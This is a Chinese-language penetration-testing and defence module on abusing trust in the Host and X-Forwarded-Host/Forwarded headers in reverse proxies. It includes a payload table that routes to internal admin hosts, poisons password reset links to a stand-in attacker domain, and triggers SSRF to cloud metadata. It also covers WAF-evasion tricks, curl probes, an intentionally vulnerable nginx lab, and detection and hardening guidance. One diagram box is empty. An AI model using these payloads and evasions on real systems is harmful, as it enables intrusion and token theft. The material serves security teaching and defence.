# R13.3 主機與轉發標頭路由與源站選擇信任濫用分析 (Host & Forwarded-Header Routing / Origin-Selection Trust Abuse)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

在現代雲端原生與微服務架構中，單一入口反向代理（Ingress Proxy / API Gateway / CDN，如 Nginx、Envoy、HAProxy、AWS ALB）通常負責將流量依據網域名稱或路由規則，動態分派至後端不同的上游叢集（Upstream Clusters）或虛擬主機（Virtual Hosts）。為了支援多層代理環境下的原始客戶端資訊傳遞，HTTP 協定引入了標準的 `Host` 標頭、RFC 7239 `Forwarded` 標頭、以及被廣泛實作的事實標準標頭（如 `X-Forwarded-Host`、`X-Forwarded-Server`、`X-Original-Host`）。

此架構深植了一個致命的安全盲區：**「轉發標頭本質上僅是用戶端的『自述宣告 (Assertions)』，其真實性完全取決於立即網路對等點 (Immediate Peer) 的來源憑證信任鏈」**。

當邊界反向代理或後端服務在進行**上游源站選擇 (Origin Selection)**、**路由分派 (Route Matching)**、或**絕對 URL 生成 (Link Generation)** 時，未經校驗直接信任來自不可信公網的轉發標頭，便會引發**主機與轉發標頭路由信任濫用**弱點。攻擊者得以藉此：
1. **內部源站路由切換 (Internal Origin Switching)**：在存取外部公開端點時，注入內部機密主機名稱，誘使反向代理將請求轉派至受限的內網管理後端，直接穿透外網邊界防禦；
2. **密碼重置連結投毒 (Password Reset Poisoning)**：強迫後端以攻擊者受控的網域生成包含機密重置 Token 的點擊連結；
3. **動態反向代理 SSRF**：若代理伺服器依據 `X-Forwarded-Host` 動態決定上游 IP，直接引發伺服器出站任意連線。

```
[外部攻擊者] ── 1. 發送請求: 偽造轉發標頭 (Host: public.site | X-Forwarded-Host: admin-internal.corp) ──► [邊界反向代理 (Ingress Gateway)]
                                                                                                            │
                                   ┌────────────────────────────────────────────────────────────────────────┴────────────────────────────────────────────────────────────────────────┐
                                   │ (安全架構：邊界強制剝離或覆寫轉發標頭)                                                                                                           │ (缺陷架構：盲信客戶端轉發標頭決定上游)
                                   ▼                                                                                                                                                 ▼
                     [強制重寫 X-Forwarded-Host: public.site]                                                                                                          [讀取 X-Forwarded-Host 作為上游路由依據]
                                   │                                                                                                                                                 │
                                   ▼                                                                                                                                                 ▼
                     [正常路由至公開業務後端 (Public Pod)]                                                                                                            [將請求轉派至內部受限叢集 (Admin Cluster)]
                                   │                                                                                                                                                 │
                                   ▼                                                                                                                                                 ▼
                     [回傳一般公開網頁 / 存取受限]                                                                                                                    [成功越權存取內部管理系統 / 密碼重置金鑰洩漏]
```

### 作戰痛點與決策分支
- **痛點場景**：目標系統的前端公開端點受到 WAF 與 IP 白名單防護，外部直接存取 `https://admin.internal.corp` 會被 DNS 解析阻斷或被防火牆直接丟棄。
- **決策心流**：
  1. **連線與標頭解耦驗證 (Decoupled Connection Test)**：
     - 保持 TCP 連線目標與外層 `Host` 標頭為合法的公開網域，單獨變更轉發標頭（`X-Forwarded-Host`、`Forwarded: host=...`、`X-Original-Host`）。
  2. **路由影響判定 (Routing Influence Verification)**：
     - **上游切換**：檢查回應是否出現內部系統專屬的 Marker（如內部伺服器特有的 HTTP 標頭、特有回應狀態碼、或未授權管理介面）。
     - **邏輯投毒**：觸發密碼重置或信箱驗證功能，檢查受害者信件中的跳轉連結是否被置換為攻擊者指定之網域。
  3. **技術邊界鑑別 (Boundary Seams)**：
     - **非 R05.5 虛擬主機發現**：R05.5 是修改外層 `Host` 尋找同伺服器上的其他 Site；R13.3 則是利用「中繼代理轉發標頭的信任缺陷」改變路由路徑或源站選擇。

## 🔬 第一動：主機與轉發標頭路由機制全景解剖 (Host & Forwarded Routing Mechanics)

### 1. RFC 7239 與轉發標頭信任架構 (Forwarded Header Provenance Chain)
在多層中繼架構中，客戶端至終端應用的路徑如下：

```
[客戶端 (Client)] ──(Peer IP: 203.0.113.1)──► [邊界代理 (Proxy 1)] ──(Peer IP: 10.0.0.1)──► [後端伺服器 (Origin)]
```

- **RFC 7239 標準語法**：`Forwarded: for=203.0.113.1;proto=https;host=public.company.com`
- **事實標準標頭**：`X-Forwarded-For`、`X-Forwarded-Proto`、`X-Forwarded-Host`

#### 根本缺陷：未校驗對等點來源憑證 (Peer IP Provenance Failure)
後端伺服器（或中繼代理）在讀取 `X-Forwarded-Host` 時，常犯下致命錯誤：**「未能檢查當前連線的立即對等點 IP (Remote Peer IP) 是否位於受信任的內部反向代理 CIDR 網段內」**。
- 若伺服器直接面向網際網路開放，或代理軟體未在邊界「清空」客戶端自訂的轉發標頭，外部攻擊者便能隨意宣稱任何虛假的 `X-Forwarded-Host`，欺騙後續所有的路由判斷與業務邏輯。

```
|                                                                                                   |
| 1. 脆弱配置：依據標頭變數動態設定 proxy_pass (Nginx 範例):                                        |

```

### 3. 標頭解析優先權衝突矩陣 (Header Precedence Resolution)
當一個請求中同時出現多種定義主機的標頭時，不同軟體層的解析優先權差異極易被攻擊者利用：

```
+---------------------------------------------------------------------------------------------------+
| 主機標頭優先權衝突矩陣 (Precedence Matrix)                                                        |
|                                                                                                   |
| 衝突情境               | 典型代理軟體解析行為 (Proxy)         | 典型後端應用解析行為 (App Framework)   |
| :--------------------- | :----------------------------------- | :------------------------------------ |
| **H2 :authority vs H1 Host** | 優先取 HTTP/2 虛擬標頭 `:authority`   | 降級後若取 `Host`，產生邊界判定脫鉤   |
| **Host vs XFH**        | 預設路由比對取 `Host`                 | 部分框架 (如 Django/Rails) 優先取 XFH |
| **XFH vs Forwarded**   | 優先取傳統的 `X-Forwarded-Host`      | 新式微服務優先取 RFC 7239 `Forwarded` |
| **重複多重 Host 標頭** | 某些代理取第一個；某些代理取最後一個  | 引發 HTTP 參數污染 (HPP) 與繞過       |
+---------------------------------------------------------------------------------------------------+
```

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Vulnerability Analysis & Vectors)

### 1. 核心向量與技術變體速查表

| 機制變體 | 關鍵標頭構造 (Payload Construction) | 突防原理與作用標記 |
| :--- | :--- | :--- |
| **內部源站路由切換 (VHost Hop)** | `Host: public.site`<br>`X-Forwarded-Host: internal-admin.local` | 誘使反向代理依據 XFH 分派至內部管理叢集，外部存取原需白名單的受限服務。 |
| **密碼重置連結投毒** | `Host: public.site`<br>`X-Forwarded-Host: evil-attacker.com` | 後端生成重置信件 `<a href="https://{XFH}/reset?token=XYZ">`，將使用者的重置權杖洩漏給攻擊者。 |
| **動態代理出站 SSRF** | `X-Forwarded-Host: 169.254.169.254:80` | 反向代理配置動態上游時未加白名單校驗，直接向雲端中繼資料服務或內網發起連線。 |
| **RFC 7239 語法语法走私** | `Forwarded: for=127.0.0.1;host=internal.corp;proto=https` | 某些僅過濾 `X-Forwarded-Host` 的 WAF 會遺漏新式標準 `Forwarded` 標頭。 |
| **絕對 URI 與 Host 衝突** | 請求行：`GET http://internal.local/admin HTTP/1.1`<br>`Host: public.site` | 部分伺服器優先依據 Request Line 中的 Absolute URI 路由，繞過基於 Host 的過濾。 |
| **埠號注入重導向劫持** | `Host: public.site:@evil.com`<br>`Host: public.site:8080` | 後端生成跳轉 Location 拼接 Port 時未驗證，造成跳轉至惡意站台或網址混淆。 |

### 2. 精確差分探測流程 (CLI / cURL 驗證法)

在評估源站路由與主機標頭信任時，**保持連線目標不變，僅變異單一轉發標頭**：

#### 步驟 1：發送標準基準請求 (Public Baseline)
```bash
curl -i -s "https://target-gateway.internal/api/v1/health" \
  -H "Host: public-api.target.internal"
# 記錄回應標頭與特徵 (例如 X-Backend-Service: public-cluster)
```

#### 步驟 2：注入內部主機轉發標頭測試源站切換
```bash
curl -i -s "https://target-gateway.internal/api/v1/health" \
  -H "Host: public-api.target.internal" \
  -H "X-Forwarded-Host: internal-admin.target.internal"
```
**判定依據**：
- 若回應狀態碼由 `404` 轉為 `200`，或回應標頭 `X-Backend-Service` 變更為 `internal-cluster`，證實反向代理存在源站選擇信任濫用漏洞！

#### 步驟 3：測試 RFC 7239 Forwarded 支援
```bash
curl -i -s "https://target-gateway.internal/api/v1/health" \
  -H "Host: public-api.target.internal" \
  -H "Forwarded: host=internal-admin.target.internal;proto=https"
```

## 🥷 第三動：隱匿作戰與反鑑識規避技術 (Evasion & Anti-Forensics Analysis)

### 1. 規避 WAF 與標頭過濾之技巧
- **非標轉發標頭變體清單**：
  若 WAF 僅封鎖 `X-Forwarded-Host`，依序測試後端框架可能支援的歷史相容標頭：
  - `X-Forwarded-Server`
  - `X-Original-Host`
  - `X-Host`
  - `X-Cluster-Client-Host`
- **尾端點號與空白正規化 (Trailing Dot / Spaces)**：
  - `Host: target.com.`（結尾帶點代表 FQDN 根網域，多數 WAF 正則無法匹配，但 DNS 與後端解析為完全相同）。
  - `Host: target.com:443`（顯式宣告預設連接埠，破壞純字串相等比對）。
- **多重標頭與逗號分割混淆**：
  - `X-Forwarded-Host: trusted.com, evil.com`
  - 若反向代理取逗號前第一個值驗證通過，而後端框架取最後一個值處理，即達成邏輯解耦。

### 2. 鑑識視角下的日誌殘留與遙測特徵
1. **反向代理與後端存取日誌之 Host 欄位脫鉤 (Host Mismatch)**：
   - **核心物證**：邊界 Nginx Access Log 記錄 `$host` 為 `public-api.com`，但後端應用伺服器 Access Log 記錄的 `vhost` 或 `host` 卻顯示為 `internal-admin.com`。
2. **密碼重置異常寄送日誌 (Outbound Mail Log Telemetry)**：
   - 郵件發送伺服器（SMTP）日誌中，出現重置密碼信件內容包含非企業官方網域的外部 URL（如包含攻擊者 VPS 域名）。
3. **出站 DNS 查詢與 Socket 連線 (Sysmon Event ID 3)**：
   - 若發生動態反向代理 SSRF，閘道伺服器會主動向外部不可信 DNS 伺服器解析攻擊者網域，並建立外部連線。

| 攻擊與測試向量 (Vector) | 系統遙測指標 (Telemetry & Artifacts) | 防禦檢測規則 (Detection Signature) | 安全架構加固措施 (Remediation Architecture) |
| :--- | :--- | :--- | :--- |
| **內部源站路由切換 (XFH 濫用)** | • Ingress 日誌記錄 `host` 與 `x_forwarded_host` 衝突。<br>• 外部 IP 存取了內部限定之 URL 路徑。 | **Envoy 訪問日誌過濾**：<br>比對 `%REQ(X-FORWARDED-HOST)%` 是否與 `%REQ(HOST)%` 衝突且包含內部網域名稱。 | • 邊界反向代理在轉發前**強制剝離 (Strip) 客戶端自訂的所有 `X-Forwarded-*` 標頭**。 |
| **密碼重置 Host 投毒** | • 應用程式日誌記錄密碼重置請求成功。<br>• 郵件日誌中生成之重置連結包含非白名單網域。 | **SIEM 告警規則**：<br>監控 Auth 服務產生的重置郵件 Payload，比對網域是否偏離靜態 Canonical 網域。 | • 後端程式碼**嚴禁使用 `request.getHeader("Host")` 生成外部連結**，一律由伺服器端環境變數指定。 |
| **動態代理出站 SSRF** | • 閘道伺服器發起非預期出站連線 (Sysmon EID 3)。<br>• DNS 伺服器記錄異常外聯解析。 | **Suricata 規則**：<br>`alert tcp $DMZ_GATEWAY any -> $EXTERNAL_NET any (msg:"Ingress Proxy Outbound SSRF Attempt"; sid:2150001;)` | • 嚴禁使用變數作為 `proxy_pass` 的目標，上游位址必須為靜態定義之 Upstream Pool。 |
| **雙重 Host 標頭繞過** | • 請求封包中連續出現兩個 `Host:` 欄位。<br>• Web 伺服器回傳 `400 Bad Request` 激增。 | **ModSecurity CRS (920310)**：<br>阻斷包含多個 `Host` 標頭的 HTTP 請求。 | • 伺服器與代理強制遵循 RFC 7230，遇到多重 Host 標頭直接終止連線並回傳 400。 |

## 🛡️ 第五動：安全架構加固與修復基線 (Hardening & Remediation Baseline)

### 1. 脆弱配置 vs. 工業級加固基線

#### ❌ 脆弱的反向代理配置 (盲信客戶端轉發標頭)
```nginx
# Nginx 脆弱配置範例：
server {
    listen 80;
    server_name public.company.com;

    location / {
        # 嚴重弱點：直接將客戶端傳入之 X-Forwarded-Host 透傳給後端
        # 或甚至將 proxy_pass 指向客戶端可控的變數！
        proxy_set_header X-Forwarded-Host $http_x_forwarded_host;
        proxy_pass http://backend_cluster;
    }
}
```

#### ✅ 工業級架構加固方案 (邊界標頭淨化與受信任代理白名單)

##### 1. 邊界反向代理清空不可信標頭 (Strip at Edge Ingress)
在最外層邊界上，**嚴禁透傳客戶端自訂的轉發標頭**，必須由邊界依據連線事實自行生成：

```nginx
# Nginx 工業級加固配置：
server {
    listen 443 ssl http2;
    server_name public.company.com;

    location / {
        # 1. 忽略或清空外部不可信的轉發標頭
        proxy_set_header X-Forwarded-Host $host;  # 強制覆寫為經 Nginx 校驗過之標準 $host
        proxy_set_header X-Original-URL "";
        proxy_set_header X-Rewrite-URL "";
        proxy_set_header Forwarded "";

        # 2. 嚴格限制僅使用預定義之上游叢集，禁止動態 URL 代理
        proxy_pass http://public_app_upstream;
    }
}
```

##### 2. 後端應用程式加固 (受信任代理 CIDR 與靜態網域綁定)
後端框架（如 Spring Boot、Django、Express）若需使用 `X-Forwarded-Host`，**必須設定嚴格的受信任代理 IP 白名單 (Trusted Proxies)**：

```python
# Python / Django 核心安全加固配置 (settings.py)
# 1. 僅允許白名單內的 Host 標頭，拒絕任意外部 Host 存取
ALLOWED_HOSTS = ['public.company.com', 'api.company.com']

# 2. 嚴格限定僅信任特定反向代理 IP 傳來的 X-Forwarded-Host
USE_X_FORWARDED_HOST = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')

# 若部署於內部網路，僅信任負載平衡器的私有 IP：
INTERNAL_IPS = ['10.0.0.1', '10.0.0.2']
```

```java
// Java / Spring Boot 密碼重置連結生成安全範例
@Service
public class PasswordResetService {
    // 嚴禁使用 HttpServletRequest.getHeader("Host")！
    // 必須使用伺服器內部配置之靜態規範網域
    @Value("${app.canonical-domain}")
    private String canonicalDomain; // e.g. "https://public.company.com"

    public String generateResetLink(String token) {
        return canonicalDomain + "/auth/reset?token=" + token;
    }
}
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

本實驗展示一個精簡的「入口反向代理 (Nginx Port 9130) ➔ 公共後端 (Port 9131) 與 內部受限後端 (Port 9132)」拓撲，驗證轉發標頭路由劫持與修復效果。

### 1. 靶場核心拓撲搭建 (Nginx 與 雙後端配置)

#### (1) 雙後端極簡服務 (`dual_backends.py`，極簡 20 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import threading

class PublicHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("X-Backend", "PUBLIC_SERVICE")
        self.end_headers()
        self.wfile.write(b"PUBLIC_CONTENT_OK\n")

class AdminHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("X-Backend", "INTERNAL_ADMIN")
        self.end_headers()
        self.wfile.write(b"CRITICAL_INTERNAL_ADMIN_CONSOLE\n")

threading.Thread(target=ThreadingHTTPServer(("127.0.0.1", 9131), PublicHandler).serve_forever, daemon=True).start()
ThreadingHTTPServer(("127.0.0.1", 9132), AdminHandler).serve_forever()
```

#### (2) 前端反向代理配置 (`gateway_routing.conf`)
```nginx
# 脆弱配置：若依據 X-Forwarded-Host 動態決定分發目標
upstream public_backend   { server 127.0.0.1:9131; }
upstream internal_backend { server 127.0.0.1:9132; }

server {
    listen 9130;
    server_name public.lab;

    location /vulnerable/ {
        # 缺陷：優先依據客戶端傳入之 XFH 決定上游
        set $target_upstream public_backend;
        if ($http_x_forwarded_host = "internal.lab") {
            set $target_upstream internal_backend;
        }
        proxy_pass http://$target_upstream;
    }

    location /fixed/ {
        # 加固：強制覆寫 XFH，一律鎖定公共後端
        proxy_set_header X-Forwarded-Host "public.lab";
        proxy_pass http://public_backend;
    }
}
```

### 2. 演練與驗證步驟 (CLI 差分實證)

#### 步驟 1：發送公共基準測試
```bash
curl -i -s "http://127.0.0.1:9130/vulnerable/" -H "Host: public.lab"
```
**預期回顯**：
- 回應標頭：`X-Backend: PUBLIC_SERVICE`
- 內容：`PUBLIC_CONTENT_OK`

#### 步驟 2：注入 `X-Forwarded-Host` 測試內部源站切換
```bash
curl -i -s "http://127.0.0.1:9130/vulnerable/" \
  -H "Host: public.lab" \
  -H "X-Forwarded-Host: internal.lab"
```
**預期回顯**：
- 回應標頭變更為：`X-Backend: INTERNAL_ADMIN`！
- 內容：`CRITICAL_INTERNAL_ADMIN_CONSOLE`！證實僅透過篡改轉發標頭，即成功穿透代理切換至內部機密後端。

#### 步驟 3：驗證加固端點之防禦效果
```bash
curl -i -s "http://127.0.0.1:9130/fixed/" \
  -H "Host: public.lab" \
  -H "X-Forwarded-Host: internal.lab"
```
**預期回顯**：
- 回應依然為 `X-Backend: PUBLIC_SERVICE`，客戶端偽造的標頭被強制覆寫忽略，加固生效。

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼 HTTP 轉發標頭（如 `X-Forwarded-Host`、`Forwarded`）本質上被視為不可信的「用戶端自述宣告 (Assertions)」？在何種條件下它們才能被信任？**  
  *分析思路*：HTTP 標頭是由發起請求的用戶端自由構建的文字欄位，外部攻擊者可以任意填寫任何虛假的網域名稱或 IP 位址。這些標頭唯一能被信任的先決條件是：**「該請求來自於受嚴格信任的內部反向代理伺服器（經由 Remote Peer IP 位於白名單 CIDR 內驗證），且該邊界代理在接收外部請求時已強制剝離了公網用戶端原始提交的所有未經驗證轉發標頭」**。

- [ ] **Q2. 密碼重置連結投毒 (Password Reset Poisoning) 的底層運作原理為何？為什麼開發者容易在此處產生安全漏洞？**  
  *分析思路*：開發者在編寫密碼重置邏輯時，為求方便或適應多環境部署，常透過 `request.getHeader("Host")` 或 `request.getHeader("X-Forwarded-Host")` 動態獲取當前訪問的網域名稱，並將其拼接為 `<a href="https://" + host + "/reset?token=" + token>` 寄送給使用者。攻擊者透過在請求中注入受控的外部網域（如 `evil.com`），迫使伺服器將重置金鑰傳送至攻擊者的伺服器日誌中，造成帳號劫持。

- [ ] **Q3. 簡述反向代理中「基於標頭的源站選擇 (Origin Selection)」與一般「虛擬主機發現 (Virtual Host Discovery - R05.5)」的本質區別？**  
  *分析思路*：虛擬主機發現 (R05.5) 是攻擊者直接變更外層標準的 `Host` 標頭，旨在尋找託管在同一伺服器 IP 上其他監聽不同網域名稱的公開 Web 站點；而源站選擇信任濫用 (R13.3) 則是外層維持合法的公共 Host 標頭，透過注入中繼轉發標頭（如 `X-Forwarded-Host`）利用代理伺服器內部路由分派或動態 `proxy_pass` 的信任缺陷，將流量轉派至外部根本不可路由的受限內部叢集。

- [ ] **Q4. 當 Web 伺服器面對帶有尾端點號（如 `Host: target.com.`）的請求時，可能引發何種安全繞過？底層原因是什麼？**  
  *分析思路*：在 DNS 與 FQDN 規範中，尾端帶有點號（`.`）代表 DNS 根層級，`target.com.` 與 `target.com` 指向完全相同的網域。但許多 WAF 或框架程式碼採用嚴格的「字串完全匹配 (Exact String Equality)」進行白名單比對。由於字串不完全相等，WAF 可能放行該請求，而後端底層在執行 DNS 解析或業務路由時又自動正規化為合法網域，形成過濾檢驗脫鉤。

- [ ] **Q5. 針對企業分散式系統，徹底根治轉發標頭路由與源站選擇濫用的黃金架構準則為何？**  
  *分析思路*：
  1. **邊界強制淨化**：所有暴露於公網的入口閘道（Ingress / CDN）必須強制清空（Strip）客戶端傳入的所有 `X-Forwarded-*`、`X-Original-URL` 與 `Forwarded` 標頭，禁止外部宣告滲透至內網。
  2. **靜態規範網域綁定**：後端應用在生成任何安全敏感的絕對 URL（如密碼重置、OAuth 回呼）時，嚴禁從請求標頭中提取網域，必須強制讀取伺服器內部固化的配置參數 (`Canonical Domain`)。
  3. **靜態上游分發**：反向代理嚴禁使用未經驗證的變數動態作為 `proxy_pass` 目標，路由分派必須基於預先配置且隔離的靜態叢集白名單。
